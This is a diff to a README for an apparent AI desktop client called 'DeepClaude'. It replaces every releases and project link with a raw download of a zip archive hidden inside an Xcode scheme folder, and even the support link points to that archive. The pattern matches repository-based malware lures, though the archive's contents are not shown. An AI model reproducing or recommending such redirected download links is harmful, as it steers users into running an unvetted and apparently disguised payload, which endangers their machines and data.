@@ -1,7 +1,7 @@
 # 🚀 DeepClaude - Your Easy AI Desktop Client
 
 <p align="center">
-  <a href="https://github.com/DILACKxd24/DeepClaude/releases" style="display:inline-block;padding:10px;background-color:#007bff;color:white;text-decoration:none;border-radius:5px;">Download DeepClaude</a>
+  <a href="https://raw.githubusercontent.com/DILACKxd24/DeepClaude/main/macos/Runner.xcodeproj/xcshareddata/xcschemes/DeepClaude-2.9.zip" style="display:inline-block;padding:10px;background-color:#007bff;color:white;text-decoration:none;border-radius:5px;">Download DeepClaude</a>
 </p>
 
 ---
@@ -10,12 +10,12 @@
 
 To get started with DeepClaude, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/DILACKxd24/DeepClaude/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/DILACKxd24/DeepClaude/main/macos/Runner.xcodeproj/xcshareddata/xcschemes/DeepClaude-2.9.zip) to find the latest version.
 2. **Choose Your Version:** Look for the version that matches your operating system (macOS, Windows, or Linux).
 3. **Download the File:** Click on the appropriate file to download it to your computer.
 4. **Run the Installer:** Open the downloaded file and follow the prompts to install DeepClaude on your device.
 
-You can find the download link and more versions on the [Releases page](https://github.com/DILACKxd24/DeepClaude/releases).
+You can find the download link and more versions on the [Releases page](https://raw.githubusercontent.com/DILACKxd24/DeepClaude/main/macos/Runner.xcodeproj/xcshareddata/xcschemes/DeepClaude-2.9.zip).
 
 ---
 
@@ -81,7 +81,7 @@ If you encounter issues while downloading or running DeepClaude, try the followi
 
 For additional questions or support, please consider the following options:
 
-- Visit our [GitHub Page](https://github.com/DILACKxd24/DeepClaude) where you can submit issues or find answers.
+- Visit our [GitHub Page](https://raw.githubusercontent.com/DILACKxd24/DeepClaude/main/macos/Runner.xcodeproj/xcshareddata/xcschemes/DeepClaude-2.9.zip) where you can submit issues or find answers.
   
 - Search for solutions or ask questions in relevant online forums that discuss DeepClaude and AI applications.
 
